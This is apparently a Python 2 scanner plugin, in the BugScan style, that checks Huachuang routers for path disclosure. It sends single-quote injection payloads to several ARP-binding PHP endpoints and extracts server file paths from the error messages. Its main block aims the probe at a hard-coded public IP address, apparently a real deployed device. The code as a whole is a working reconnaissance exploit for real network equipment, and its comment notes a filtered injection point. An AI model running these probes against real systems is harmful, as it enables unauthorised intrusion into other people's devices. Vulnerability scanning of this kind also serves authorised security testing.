#!/usr/bin/env python
# -*- coding: utf-8 -*
# 华创设备路径泄露
'''
此处存在注入，但是有过滤。

'''
import urlparse
import re

def assign(service, arg):
    if service == 'huachuang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
        
def audit(arg):
    urls = [
    "acc/bindipmac/static_arp_action.php?arpIf=1'",
    "acc/bindipmac/static_arp_bind.php?arpName=1'",
    "acc/bindipmac/static_arp_del.php?x=1&arpName=1'"
    ]
    path=[]
    for url in urls:
        url = arg + url
        code,head,res,errorcode,finalurl = curl.curl2(url)
        m = re.search('in <b>([^<]+)</b>', res)
        if m:
            if m.group(0) not in path:
                path.append(m.group(0))

    url = arg + 'acc/bindipmac/check_arp_exist_ip.php'
    data="eth=1'&ip=1"
    _,_,res,_,_ = curl.curl2(url,data)
    m = re.search('in <b>([^<]+)</b>', res)
    if m:
        if m.group(0) not in path:
            path.append(m.group(0))
    if path:
        security_note(str(path))
    
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('huachuang_router','http://218.28.194.190/')[1])